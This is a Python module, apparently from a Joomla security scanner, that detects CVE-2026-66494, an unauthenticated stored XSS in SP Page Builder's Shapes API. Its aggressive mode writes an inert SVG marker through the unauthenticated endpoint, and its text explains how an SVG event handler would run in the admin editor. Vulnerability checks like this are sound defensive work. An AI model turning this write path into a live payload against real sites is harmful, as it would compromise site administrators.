from __future__ import annotations

import base64
import binascii
import json
import re
import secrets
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-66494"
NAME = "SP Page Builder unauthenticated stored XSS in the Shapes API"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.6.1; fixed in 6.7.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
ADD_PATH = "/index.php?option=com_sppagebuilder&task=image_shapes.addImageShapeAPI"
LIST_PATH = "/index.php?option=com_sppagebuilder&task=image_shapes.getImageShapesAPI"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.7.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}, within the affected range below 6.7.0. The Shapes API accepts unauthenticated writes."
        action = "Upgrade SP Page Builder to 6.7.0 or newer and remove unknown rows from the image-shapes table."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which requires an administrator session and CSRF token for the Shapes API."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.7.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Store an inert SVG marker through the unauthenticated Shapes API.

    ``image_shapes.addImageShapeAPI`` in 6.6.1 and earlier accepts a base64
    SVG from any visitor and only checks for a ``<path>`` tag. The stored
    value is returned by ``getImageShapesAPI`` and the admin editor decodes it
    with ``atob()`` before injecting it through ``dangerouslySetInnerHTML``.
    The probe uses a ``data-proofcms`` attribute, not an event handler, so the
    stored marker is inert; the proof is the unauthenticated write plus the
    raw value returned by the admin-facing API.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    marker = f"PROOFCMS_SPPB_SHAPE_{secrets.token_hex(4)}"
    svg = f'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0" data-proofcms="{marker}"/></svg>'
    encoded = base64.b64encode(svg.encode()).decode()
    response = client.request(
        f"{base}{ADD_PATH}",
        method="POST",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"shape": encoded}).encode(),
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{ADD_PATH}", detail=f"The Shapes API request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    stored_id = None
    body = response.get("body") or ""
    try:
        payload = json.loads(body)
        data = payload.get("data") if isinstance(payload, dict) else None
        if isinstance(data, dict):
            stored_id = data.get("id")
    except ValueError:
        payload = None

    listed = client.get(f"{base}{LIST_PATH}", timeout=timeout)
    listed_body = "" if is_transport_error(listed) else (listed.get("body") or "")
    retrieved = False
    for row in _shape_rows(listed_body):
        if row.get("id") == stored_id:
            try:
                decoded = base64.b64decode(str(row.get("shape") or "")).decode(errors="replace")
            except (binascii.Error, ValueError):
                decoded = ""
            if marker in decoded:
                retrieved = True
                break

    evidence = {
        "marker": marker,
        "add_status": response.get("status"),
        "stored_id": stored_id,
        "list_status": listed.get("status"),
        "retrieved": retrieved,
        "editor_sink": "atob(shape) + dangerouslySetInnerHTML",
    }
    if response.get("status") in (201, 200) and retrieved:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADD_PATH}",
            evidence=evidence,
            detail=(
                "An unauthenticated request stored a custom SVG in the Shapes API and the admin-facing "
                "getImageShapesAPI returned it raw. The editor bundle decodes the value with atob() and "
                "injects it through dangerouslySetInnerHTML, so an SVG event handler executes when an "
                "administrator opens the image-shape field. The probe stored only an inert marker."
            ),
            action="Upgrade SP Page Builder to 6.7.0 or newer and delete unknown rows from the image-shapes table.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{ADD_PATH}",
        evidence=evidence,
        detail=(
            f"The Shapes API returned HTTP {response.get('status')} and the marker was "
            f"{'not returned' if not retrieved else 'not stored'} by getImageShapesAPI; 6.7.0+ "
            "requires an administrator session, a CSRF token, and validates the SVG."
        ),
        action="Upgrade affected SP Page Builder versions even when the external proof is inconclusive.",
    )


def _shape_rows(body: str) -> list[dict[str, Any]]:
    try:
        payload = json.loads(body)
    except ValueError:
        return []
    data = payload.get("data") if isinstance(payload, dict) else None
    return [row for row in data if isinstance(row, dict)] if isinstance(data, list) else []


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{LIST_PATH}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Shapes API could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Shapes API is reachable; the stored-XSS payload was not sent in safe mode.", action="Use aggressive mode with an inert marker on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (Shapes API reachability) and aggressive (unauthenticated stored marker) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Cross-Site Scripting (XSS)", "module_version": "1.0.0", "last_reviewed": "2026-11-16", "updated": "2026-11-16", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-66494", "https://www.joomshaper.com", "https://mysites.guru/vulnerabilities/CVE-2026-66494"]}
